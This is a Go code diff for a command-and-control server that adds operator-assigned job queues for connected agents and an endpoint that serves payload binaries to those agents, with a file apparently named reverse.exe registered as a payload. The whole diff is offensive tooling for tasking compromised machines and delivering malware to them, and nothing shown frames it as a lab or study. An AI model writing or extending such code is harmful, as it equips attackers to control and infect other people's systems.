@@ -6,6 +6,7 @@ import (
 	"io"
 	"net"
 	"os"
+	"path/filepath"
 	"time"
 
 	jwt "github.com/appleboy/gin-jwt/v2"
@@ -20,7 +21,8 @@ type C2Server struct {
 	operatorIdentityKey  string
 	operatorPasswordHash string
 	activeAgents         []Agent
-	agentJobs            map[string]Job
+	jobs                 map[string][]string
+	payloads             map[string]string
 }
 
 type connectAgent struct {
@@ -34,11 +36,6 @@ type Agent struct {
 	Hostname string
 	Ip       string
 }
-
-type Job struct {
-	queue []string
-}
-
 type login struct {
 	Username string `form:"username" json:"username" binding:"required"`
 	Password string `form:"password" json:"password" binding:"required"`
@@ -78,6 +75,9 @@ func NewC2Server(hostOpt, portOpt, password string) (*C2Server, error) {
 		return nil, err
 	}
 	c2s.r = r
+	c2s.jobs = make(map[string][]string)
+	c2s.payloads = make(map[string]string)
+	c2s.payloads["cccccccccccccccc"] = "reverse.exe"
 	return &c2s, nil
 }
 
@@ -99,7 +99,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	agent.Use(authAgentMiddleware.MiddlewareFunc())
 	{
 		agent.GET("/jobs", c2s.jobsHandler)
-		agent.GET("/payload", c2s.payloadHandler)
+		agent.GET("/payload/:jobuid", c2s.payloadHandler)
 	}
 
 	authOperatorMiddleware, err := c2s.initOperatorJWTMiddleware()
@@ -114,6 +114,7 @@ func (c2s *C2Server) setupRouter() (*gin.Engine, error) {
 	operator.Use(authOperatorMiddleware.MiddlewareFunc())
 	{
 		operator.GET("/agents/", c2s.agentsHandler)
+		operator.POST("/agent/job/add", c2s.addJobHandler)
 	}
 	return r, nil
 }
@@ -195,23 +196,19 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 }
 
 func (c2s *C2Server) jobsHandler(c *gin.Context) {
-	claims := jwt.ExtractClaims(c)
 	agent, _ := c.Get(c2s.agentIdentityKey)
-	c.JSON(200, gin.H{
-		"uid":      claims[c2s.agentIdentityKey],
-		"hostname": agent.(*Agent).Hostname,
-		"ip":       agent.(*Agent).Ip,
-	})
+	c.JSON(200, c2s.jobs[agent.(*Agent).Uid])
 }
 
 func (c2s *C2Server) payloadHandler(c *gin.Context) {
-	claims := jwt.ExtractClaims(c)
-	agent, _ := c.Get(c2s.agentIdentityKey)
-	c.JSON(200, gin.H{
-		"uid":      claims[c2s.agentIdentityKey],
-		"hostname": agent.(*Agent).Hostname,
-		"ip":       agent.(*Agent).Ip,
-	})
+	jobUid := c.Param("jobuid")
+	payloadFilename := c2s.payloads[jobUid]
+	payloadPath := filepath.Join("data/c2/payloads/", payloadFilename)
+	c.Header("Content-Description", "File Transfer")
+	c.Header("Content-Transfer-Encoding", "binary")
+	c.Header("Content-Disposition", "attachment; filename="+payloadFilename)
+	c.Header("Content-Type", "application/octet-stream")
+	c.File(payloadPath)
 }
 
 func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
@@ -280,6 +277,21 @@ func (c2s *C2Server) initOperatorJWTMiddleware() (*jwt.GinJWTMiddleware, error) 
 
 func (c2s *C2Server) agentsHandler(c *gin.Context) {
 	c.JSON(200, c2s.activeAgents)
+}
+
+func (c2s *C2Server) addJobHandler(c *gin.Context) {
+	var addJobRequest struct {
+		AgentUid string `json:"agent-uid" binding:"required"`
+		JobUid   string `json:"job-uid" binding:"required"`
+	}
+	if c.Bind(&addJobRequest) == nil {
+		if len(c2s.jobs[addJobRequest.AgentUid]) == 0 {
+			c2s.jobs[addJobRequest.AgentUid] = []string{addJobRequest.JobUid}
+		} else {
+			c2s.jobs[addJobRequest.AgentUid] = append(c2s.jobs[addJobRequest.AgentUid], addJobRequest.JobUid)
+		}
+	}
+	c.JSON(200, gin.H{"status": "ok"})
 }
 
 func (c2s *C2Server) Run() error {
